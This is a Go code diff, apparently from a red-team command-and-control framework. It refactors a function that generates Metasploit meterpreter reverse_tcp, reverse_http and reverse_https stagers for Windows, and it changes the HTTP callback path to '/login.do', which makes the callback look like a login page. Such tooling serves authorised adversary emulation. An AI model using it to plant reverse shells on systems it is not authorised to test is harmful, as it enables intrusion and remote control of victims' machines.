@@ -90,8 +90,8 @@ func generateMsfStage(config *clientpb.EggConfig) ([]byte, error) {
 	var (
 		stage   []byte
 		payload string
-		options []string
 		arch    string
+		uri     string
 	)
 
 	switch config.Arch {
@@ -101,33 +101,29 @@ func generateMsfStage(config *clientpb.EggConfig) ([]byte, error) {
 		arch = "x86"
 	}
 
+	//TODO: change the hardcoded URI to something dynamically generated
 	switch config.Protocol {
 	case clientpb.EggConfig_TCP:
 		payload = "meterpreter/reverse_tcp"
 	case clientpb.EggConfig_HTTP:
 		payload = "meterpreter/reverse_http"
-		options = append(options, "LURI=/favicon.ico")
+		uri = "/login.do"
 	case clientpb.EggConfig_HTTPS:
 		payload = "meterpreter/reverse_https"
-		options = append(options, "LURI=/favicon.ico")
+		uri = "/login.do"
 	default:
 		return stage, fmt.Errorf("Protocol not supported")
 	}
 
-	// This is way too hacky: we should take the full options from the protobuf message
-	// Prevent badchars
-	options = append(options, "-b \\x00")
-	// Handle user specified format
-	options = append(options, "--format "+config.Format)
-
 	venomConfig := msf.VenomConfig{
-		Os:      "windows", // We only support windows at the moment
-		Payload: payload,
-		LHost:   config.Host,
-		LPort:   uint16(config.Port),
-		Arch:    arch,
-		Options: options,
-		// TODO: add an encoder if required
+		Os:       "windows", // We only support windows at the moment
+		Payload:  payload,
+		LHost:    config.Host,
+		LPort:    uint16(config.Port),
+		Arch:     arch,
+		Format:   config.Format,
+		BadChars: []string{"00", "0a"}, //TODO: make this configurable
+		Luri:     uri,
 	}
 	stage, err := msf.VenomPayload(venomConfig)
 	if err != nil {
